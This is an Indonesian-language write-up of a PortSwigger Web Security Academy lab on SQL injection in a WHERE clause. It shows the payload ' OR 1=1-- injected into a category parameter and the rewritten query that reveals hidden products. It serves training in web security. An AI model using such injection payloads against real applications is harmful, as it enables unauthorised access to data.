# SQL Injection Vulnerability in WHERE Clause

## Deskripsi Challenge

Challenge ini berasal dari **PortSwigger Web Security Academy** dengan level **Apprentice**.
Tujuan utamanya adalah mengeksploitasi kerentanan **SQL Injection pada WHERE clause** untuk menampilkan data produk yang seharusnya tersembunyi.

---

## Tujuan

* Mengidentifikasi kerentanan SQL Injection.
* Mengeksploitasi query menggunakan payload untuk mem-bypass filter.
* Menampilkan data produk yang tidak ditampilkan secara default.

---

## Analisis

Aplikasi rentan karena parameter pencarian produk langsung digunakan dalam query SQL tanpa sanitasi yang memadai.
Contoh query normal:

```sql
SELECT * FROM products WHERE category = 'Accessories' AND released = 1;
```

---

## Langkah-langkah

Dengan memasukkan payload berikut pada parameter `category`:

```sql
' OR 1=1--
```

Query menjadi:

```sql
SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1;
```
<img width="1919" height="958" alt="Screenshot 2025-09-11 145528" src="https://github.com/user-attachments/assets/e71262c5-06e2-4105-92fe-dd971d550c3f" />

Efeknya:

* Kondisi `OR 1=1` selalu **true**.
* Semua produk, termasuk yang tersembunyi, akan ditampilkan.

---

## Hasil

Setelah menjalankan payload, aplikasi menampilkan produk tersembunyi (hidden products).
Dengan begitu challenge dianggap **terselesaikan**.
<img width="1919" height="961" alt="Screenshot 2025-09-11 145554" src="https://github.com/user-attachments/assets/b23e092f-2b0b-4f11-90e8-c89149ccca29" />


